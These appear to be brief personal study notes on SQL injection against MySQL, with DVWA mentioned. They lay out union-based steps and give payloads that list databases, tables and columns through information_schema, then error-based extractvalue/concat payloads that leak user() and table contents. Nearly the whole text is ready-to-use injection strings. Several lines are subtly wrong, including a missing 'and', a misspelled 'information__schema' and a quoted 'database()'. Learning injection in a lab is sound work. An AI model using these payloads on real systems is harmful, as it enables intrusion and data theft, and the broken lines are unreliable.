Sql query
 
1. Balancing query
2. Checking true false condition by and 1=1 or 1=2
3. Finding columns
4. Invalidating output of first query.
5. Using union select 1,2 — -                                                ——>Union select 1,table_name,3 from information_schema.tables where table_schema=‘mysql’ table_name=‘user’
->For finding table name:-  

Select table_name from information_schema.tables where table_schema=‘database()’

->Column name:-

For finding column name:-(specify table_name of table)

Select column_name from information_schema.columns where table_schema=‘security, mysql,dvwa or database()’ and table_name=‘user’

->For finding database list:-

Select group_concat(table_schema) from information__schema.tables

=====Sql query for error base=====

->and extractvalue(1,concat(0x7e,user()))

->We can’t use direct select statement  in this function we have to make it inline query….

and extractvalue(1,concat(0x7e,(select * from table name)))

->Here we make it inline query by injecting in (____) field.



